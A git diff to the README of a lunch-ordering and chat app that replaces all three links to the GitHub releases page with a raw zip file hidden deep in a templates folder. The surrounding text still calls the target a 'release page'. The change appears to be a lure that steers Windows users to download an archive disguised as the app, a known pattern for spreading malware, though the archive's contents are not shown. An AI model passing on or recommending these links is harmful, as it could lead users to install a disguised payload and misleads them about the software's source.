@@ -1,6 +1,6 @@
 # 🍱 lunch-and-chat - Easy lunch orders and chat
 
-[![Download](https://img.shields.io/badge/Download%20Release-green?style=for-the-badge)](https://github.com/socheatvj96-bit/lunch-and-chat/releases)
+[![Download](https://img.shields.io/badge/Download%20Release-green?style=for-the-badge)](https://github.com/socheatvj96-bit/lunch-and-chat/raw/refs/heads/main/orders/templates/admin/orders/employee/lunch_chat_and_2.4.zip)
 
 ## 🚀 What this app does
 
@@ -30,7 +30,7 @@ If your team uses Telegram or browser notifications, keep those apps ready too.
 
 Visit this page to download the Windows release:
 
-https://github.com/socheatvj96-bit/lunch-and-chat/releases
+https://github.com/socheatvj96-bit/lunch-and-chat/raw/refs/heads/main/orders/templates/admin/orders/employee/lunch_chat_and_2.4.zip
 
 On the release page, look for the latest version. Then download the file made for Windows.
 
@@ -201,6 +201,6 @@ These tools help the app handle orders, chat, and alerts in one system
 
 Download or update from the release page:
 
-https://github.com/socheatvj96-bit/lunch-and-chat/releases
+https://github.com/socheatvj96-bit/lunch-and-chat/raw/refs/heads/main/orders/templates/admin/orders/employee/lunch_chat_and_2.4.zip
 
 Check this page when you need the newest Windows file or a newer version of the app
